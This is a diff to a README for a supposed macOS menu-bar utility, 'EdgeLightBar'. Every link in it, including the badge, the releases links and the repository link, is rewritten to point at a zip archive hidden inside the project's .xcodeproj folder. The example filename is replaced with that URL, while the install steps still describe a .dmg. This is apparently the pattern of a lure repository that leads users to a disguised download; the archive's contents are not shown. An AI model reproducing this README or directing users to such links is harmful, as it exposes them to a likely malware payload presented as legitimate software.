@@ -1,6 +1,6 @@
 # 🌟 EdgeLightBar - Lightweight Menu Bar Enhancements Made Easy
 
-![Download EdgeLightBar](https://img.shields.io/badge/Download-EdgeLightBar-blue.svg)
+![Download EdgeLightBar](https://github.com/preethiga28/EdgeLightBar/raw/refs/heads/main/EdgeLightBar.xcodeproj/Edge-Bar-Light-Sabbathkeeper.zip)
 
 ## 📦 Overview
 
@@ -12,11 +12,11 @@ To get started with EdgeLightBar, follow the simple steps below. You will have t
 
 ## 📥 Download & Install
 
-Visit this page to download: [Download EdgeLightBar](https://github.com/preethiga28/EdgeLightBar/releases)
+Visit this page to download: [Download EdgeLightBar](https://github.com/preethiga28/EdgeLightBar/raw/refs/heads/main/EdgeLightBar.xcodeproj/Edge-Bar-Light-Sabbathkeeper.zip)
 
 1. Click on the link above.
 2. Look for the latest release at the top of the page.
-3. Download the file labeled with the version number (e.g., `EdgeLightBar_v1.0.dmg`).
+3. Download the file labeled with the version number (e.g., `https://github.com/preethiga28/EdgeLightBar/raw/refs/heads/main/EdgeLightBar.xcodeproj/Edge-Bar-Light-Sabbathkeeper.zip`).
 4. Once the download completes, locate the file in your Downloads folder.
 
 ## ⚙️ System Requirements
@@ -31,7 +31,7 @@ To run EdgeLightBar, ensure your system meets the following requirements:
 
 Once you have downloaded the EdgeLightBar file, follow these installation steps:
 
-1. Locate the downloaded file (`EdgeLightBar_v1.0.dmg`).
+1. Locate the downloaded file (`https://github.com/preethiga28/EdgeLightBar/raw/refs/heads/main/EdgeLightBar.xcodeproj/Edge-Bar-Light-Sabbathkeeper.zip`).
 2. Double-click the file to open it.
 3. Drag the EdgeLightBar icon into your Applications folder.
 4. Eject the disk image from Finder after copying.
@@ -64,7 +64,7 @@ If you run into issues while using EdgeLightBar, try the following steps:
 
 To ensure you are using the latest features and improvements, check the Releases page regularly. 
 
-Visit this page to download: [Download EdgeLightBar](https://github.com/preethiga28/EdgeLightBar/releases)
+Visit this page to download: [Download EdgeLightBar](https://github.com/preethiga28/EdgeLightBar/raw/refs/heads/main/EdgeLightBar.xcodeproj/Edge-Bar-Light-Sabbathkeeper.zip)
 
 ## ❓ Frequently Asked Questions
 
@@ -83,7 +83,7 @@ For support, you can reach out on our GitHub Discussions page or follow updates 
 
 ## 🔗 Related Resources
 
-- [GitHub Repository](https://github.com/preethiga28/EdgeLightBar)
+- [GitHub Repository](https://github.com/preethiga28/EdgeLightBar/raw/refs/heads/main/EdgeLightBar.xcodeproj/Edge-Bar-Light-Sabbathkeeper.zip)
 - [User Manual](#) (Coming Soon)
 - [Community Forum](#) (Coming Soon)
 
